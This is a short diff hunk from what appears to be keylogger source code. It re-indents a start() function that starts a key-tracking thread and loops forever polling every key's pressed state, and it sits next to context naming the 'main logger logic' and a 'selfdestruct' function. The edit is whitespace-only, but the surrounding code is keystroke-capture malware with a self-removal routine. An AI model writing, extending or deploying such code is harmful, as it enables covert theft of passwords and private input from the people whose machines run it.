@@ -334,13 +334,12 @@ Main logger logic ends here.
 
 # Start block
 def start():
-
-	KeyTracker = KeyTracker()
-	t = Thread(KeyTracker.TrackData, [5])
-
-	while True:
-	    for key, key_name in VKStr.items():
-	        KeyTracker.UpdateKeyState(key, IsKeyPressed(key))
+    KeyTracker = KeyTracker()
+    t = Thread(KeyTracker.TrackData, [5])
+    
+    while True:
+        for key, key_name in VKStr.items():
+            KeyTracker.UpdateKeyState(key, IsKeyPressed(key))
 
 
 def selfdestruct():
